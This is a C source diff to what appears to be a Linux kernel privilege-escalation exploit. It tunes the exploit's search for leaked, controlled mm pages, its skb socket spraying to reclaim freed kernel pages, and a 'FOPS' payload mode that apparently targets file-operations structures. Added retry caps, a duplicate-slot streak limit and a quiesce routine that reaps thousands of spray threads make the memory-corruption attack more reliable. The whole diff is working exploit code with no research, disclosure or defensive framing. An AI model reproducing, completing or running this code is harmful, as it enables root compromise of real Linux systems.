@@ -1192,6 +1192,9 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
   size_t chosen = max_groups;
   uintptr_t hint = 0;
   unsigned long chosen_attempt = 0;
+  unsigned long dup_streak = 0;
+  size_t dup_group = 0;
+  size_t dup_slot = 0;
   int result = 0;
 
   if (!bases || !counts || !fds || !seen || !opaque) {
@@ -1206,8 +1209,8 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
   pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
           S918_PAGE_SCAN_MAX, batch, S918_DMA32_SKIP_SLABS);
 
-  for (unsigned long attempt = 1;
-       attempt <= S918_PAGE_SCAN_MAX && !result; ++attempt) {
+  unsigned long attempt = 1;
+  for (; attempt <= S918_PAGE_SCAN_CYCLE_ATTEMPTS && !result; ++attempt) {
     uintptr_t mm = 0;
     uintptr_t base;
     size_t slot;
@@ -1216,12 +1219,14 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
     int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);
 
     if (fd == -2) {
+      dup_streak = 0;
       continue;
     }
     if (fd < 0) {
       break;
     }
     if (!controlled_mm_valid(mm)) {
+      dup_streak = 0;
       SYSCHK(close(fd));
       continue;
     }
@@ -1230,6 +1235,7 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
     if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
       size_t refs = S918_DMA32_SKIP_SLABS * batch;
 
+      dup_streak = 0;
       if (opaque_count + refs > opaque_capacity) {
         SYSCHK(close(fd));
         break;
@@ -1259,17 +1265,33 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
               attempt, group, base, hint_hit);
     }
     if (group == max_groups || slot >= batch) {
+      dup_streak = 0;
       SYSCHK(close(fd));
       continue;
     }
     if (seen[group * batch + slot]) {
+      if (dup_streak && dup_group == group && dup_slot == slot) {
+        dup_streak++;
+      } else {
+        dup_streak = 1;
+        dup_group = group;
+        dup_slot = slot;
+      }
       SYSCHK(close(fd));
-      hint = base;
+      if (dup_streak >= S918_DUP_STREAK_MAX) {
+        pr_warning("controlled mm group duplicate streak cap slot=%zu "
+                   "attempts=%zu\n", slot, (size_t)attempt);
+        hint = 0;
+        dup_streak = 0;
+      } else {
+        hint = base;
+      }
       pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
               "base=%016zx slot=%zu\n",
               attempt, group, base, slot);
       continue;
     }
+    dup_streak = 0;
     seen[group * batch + slot] = 1;
     fds[group * batch + slot] = fd;
     counts[group]++;
@@ -1286,6 +1308,10 @@ int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
     }
   }
 
+  if (!result && attempt > S918_PAGE_SCAN_CYCLE_ATTEMPTS) {
+    pr_warning("controlled mm group cycle cap attempts=%d scans=%d\n",
+               S918_PAGE_SCAN_CYCLE_ATTEMPTS, S918_PAGE_SCAN_MAX);
+  }
   pin_to_core(CORE);
   for (size_t group = 0; group < group_count; ++group) {
     for (size_t slot = 0; slot < batch; ++slot) {
@@ -2019,13 +2045,14 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
 
   int sent_count = 0;
   int stop_errno = 0;
-  for (size_t pair = 0; pair < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
+  for (size_t pair = 0;
+       pair < S918_RECLAIM_SOCKET_PAIRS && !stop_errno; ++pair) {
     int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
     for (int send_index = 0; send_index < S918_SKB_SENDS; ++send_index) {
       errno = 0;
       ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
       if (sent != (ssize_t)SKB_SEND_SIZE) {
-        stop_errno = errno;
+        stop_errno = errno ? errno : EIO;
         break;
       }
       sent_count++;
@@ -2046,6 +2073,41 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
   }
 #endif
   return sent_count ? base : 0;
+}
+
+static int controlled_mm_thread_count(void) {
+  FILE *fp = fopen("/proc/self/status", "re");
+  char line[128];
+  int tasks = 0;
+
+  if (!fp) {
+    return 0;
+  }
+  while (fgets(line, sizeof(line), fp)) {
+    if (sscanf(line, "Threads: %d", &tasks) == 1) {
+      break;
+    }
+  }
+  fclose(fp);
+  return tasks;
+}
+
+/* Between failed scan cycles: let the previous 4096-thread pile finish
+ * exiting and release any socket ballast before another search starts. */
+static void controlled_mm_cycle_quiesce(void) {
+  pin_to_core(CORE);
+  for (int i = 0; i < 64; ++i) {
+    if (waitpid(-1, NULL, WNOHANG) <= 0) {
+      break;
+    }
+  }
+  close_reclaim_sockets();
+  for (int i = 0; i < 4; ++i) {
+    sched_yield();
+  }
+  usleep(200000);
+  pr_info("controlled mm group cycle quiesce tasks=%d\n",
+          controlled_mm_thread_count());
 }
 #endif
 
@@ -2609,6 +2671,12 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     if (base) {
       return base;
     }
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+      controlled_mm_cycle_quiesce();
+    }
+#endif
     pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
                max_attempts);
   }
